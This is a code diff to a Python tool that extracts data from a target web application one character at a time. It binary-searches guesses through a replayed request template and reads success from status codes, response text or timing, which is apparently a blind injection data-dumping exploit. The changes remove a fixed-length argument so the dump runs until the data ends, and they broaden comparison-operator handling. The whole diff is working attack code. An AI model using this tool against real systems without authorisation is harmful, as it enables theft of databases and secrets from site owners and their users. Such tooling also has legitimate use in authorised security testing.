@@ -12,7 +12,6 @@ def create_argument_parser():
     parser.add_argument('-req', required=True, help="Path to the .req file used for making the requests")
     parser.add_argument('-target', required=True, help="The target URL")
     parser.add_argument('-payload', required=True, help="The payload to use with fuzzing values")
-    parser.add_argument('-length', required=True, type=int, help="The length of the data we're trying to dump")
     parser.add_argument('-mc', type=int, help="HTTP status code to indicate a successful request")
     parser.add_argument("-fc", type=int, help="HTTP status code to indicate a failed (incorrect guess) request")
     parser.add_argument('-mb', help="Text in the HTTP response body to indicate a successful request")
@@ -63,9 +62,8 @@ def binary_search(index: str, payload: str) -> str:
         mid = (low + high) // 2
         guess = possible_values[mid]
         
-        
         #Print status
-        sys.stdout.write(f"\rDump: ({int(index)}/{args.length}) {dump + guess}")
+        sys.stdout.write(f"\rDump: ({int(index) - 1}/x) {dump + guess}")
         sys.stdout.flush()
 
         # Check
@@ -77,7 +75,7 @@ def binary_search(index: str, payload: str) -> str:
             if res["statuscode"] == args.mc:
                 feedback = "g"
             elif res["statuscode"] == args.fc:
-                check_res = make_request(payload.replace(">", "="), guess)
+                check_res = make_request(payload.replace("<", "=").replace(">","="), guess)
                 if check_res["statuscode"] == args.mc:
                     feedback = "e"
                 else : feedback = "l"
@@ -86,20 +84,26 @@ def binary_search(index: str, payload: str) -> str:
             if args.mb in str(res["body"]):
                 feedback = "g"
             else:
-                check_res = make_request(payload.replace(">", "="), guess)
+                check_res = make_request(payload.replace(">", "=").replace("<","="), guess)
                 if args.mb in check_res["body"]:
                     feedback = "e"
                 else : feedback = "l"
         elif args.mt:
             # Check by response time
             if res["time"] >= args.mt:
-                check_res = make_request(payload.replace(">=", "="), guess)
+                check_res = make_request(payload.replace(">=", "=").replace("<=", "="), guess)
                 if check_res["time"] >= args.mt:
                     feedback = "e"
                 else:
                     feedback = "g"
             else:
                 feedback = "l"
+
+        # Check end
+        if len(possible_values[low:high]) == 0 and (feedback == "g" or feedback == "l"):
+            sys.stdout.write(f"\rDump: ({int(index) - 1}/{int(index) - 1}) {dump}\n")
+            sys.stdout.flush()
+            exit(0)
 
         if feedback == 'e':
             return guess
@@ -128,11 +132,11 @@ if __name__ == "__main__":
 
     # Start dumping
     print(f"Started dump at {time.ctime(time.time())}")
-    for i in range(args.length):
+    i = 0
+    while True:
         i += 1 # Start from 1 rather than 0
         secret = binary_search(str(i), payload)
         if type(secret) != str:
-            print("\nSomething went wrong with the HTTP response. Make sure you can ping the target. Exiting...")
+            print("\nSomething went wrong. Make sure you can ping the target. Exiting...")
             exit(0)
         dump += secret
-        if i == args.length : print("\n")
